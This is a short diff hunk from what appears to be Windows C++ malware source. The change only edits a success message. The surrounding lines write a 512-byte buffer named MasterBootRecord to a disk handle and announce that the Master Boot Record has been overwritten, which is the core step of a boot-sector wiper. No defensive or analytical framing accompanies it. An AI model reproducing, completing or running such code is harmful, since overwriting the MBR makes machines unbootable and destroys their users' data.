@@ -44,7 +44,7 @@ int CALLBACK WinMain(
 		OPEN_EXISTING, NULL, NULL);
 	if (WriteFile(MBR, MasterBootRecord, 512, &dwBytesWritten, 0) == TRUE)
 	{
-		cout << "Master Boot Record has been over written" << endl;
+		cout << "Master Boot Record has been over written succesfully." << endl;
 		Sleep(5000);
 		ExitProcess(0);
 	}
